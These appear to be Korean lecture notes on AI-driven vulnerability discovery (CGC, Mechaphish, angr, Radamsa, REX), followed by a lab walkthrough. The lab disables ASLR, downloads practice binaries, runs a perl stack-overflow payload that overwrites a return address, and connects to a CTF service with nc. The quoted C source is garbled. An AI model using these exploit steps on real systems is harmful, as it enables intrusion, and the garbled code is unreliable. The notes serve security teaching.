# PART3. AI 기반 취약점 탐지  

DCREE라는 7개만 가능한 sw 써서 CGC 진행됨    

### AI 기반 취약점 탐지 대회  
모든 참가팀의 서버에 CB가 데몬으로 세팅되어 있음
자신의 CB를 분석하여 취약점을 찾은 후 다른 탐가팀의 데몬을 공격한 후 키값을 획득함  
발견된 취약점은 패치를 진행하여 방어하도록 함  

#### mechaphish 라는 오픈 소스  
스택 오버 플로우 기법 ROP 기법으로 shell코드로 넘기고    
command injection은 Type2로 공격에 성공하게 하는  

취약한 바이너리에서 퍼징 , 자동으로 취약점 찾아내는, 

#### AEG
퍼징, symbolic Execution 기법을 통하여 취약점을 찾음  
익스플로잇 코드를 자동 생성하여 공격함  

퍼징: radamsa fuzz  
symbolic Execution등 분석 : ANGR  
익스플로잇 코드 생성 : REX  -> 공격코드 쉘코드로 자동 저장?   

#### Angr : shellphish 팀에서 개발한 symbolic Excution  
#### Radamsa Fuzzer : 취약한 함수의 입력값을 찾거나 크래쉬 부분  
-----
### 실습
#### 초기 비밀번호 설정
```
sudo passwd root
su
id
```

#### 예전 아키텍처 사용

```
disass main ( 어셈블리 명령어확인) 
```
       
```
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
b *main+35 (브레이크 포인트 걸기)
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
info reg
x/16x $sep
```

#### 쉘 코드 작성 - 스택오버플로우  
```
wget http://javahacking.com/aihacking/shell.txt
cat shell.txt
```

```
sysctl -w kernel.randomize_va_space = 0  //커널 고정
wget http://javahacking.com/aihacking/getenv
chmod 755 getenv
./getenv
>(nil)
```

```
sysctl -w kernel.randomize_va_space = 0  //커널 고정
./getenv
./getenv //고정됐는지 확인!
> 0xffff1aa5

./login `perl -e 'print "A"x8, "\xa5\x1a\xff\xff"'`
>AAAAAAAA????
exit 
```

#### CTF  
```
wget http://javahacking.com/aihacking/nonull
chmod 755 nonull
./nonull
```
#### 접속됐는지 확인하기 위해 shell 하나 더 켜서
```
netstate -na
nc localhost 12344
```

#### 실제 nonull.txt 파일 보고 공격해보기
```
// nonull.txt 소스
nonull
12344

#define MAX_RECV 128

char key[MAX_RECV] = {0x00, };
char gs[4] = {0xadm 0x00, 0x00, 0xff};
char bug[MAX_RECV] = {0x00, };

fp = fopen("/home/ctf2/key", "r");
fread(key, 1024m 1m fp);
fclose(fp);

recv_data(sock, buf, MAX_RECV + 5);
send_data(sock, buf, strlen(buf));
```



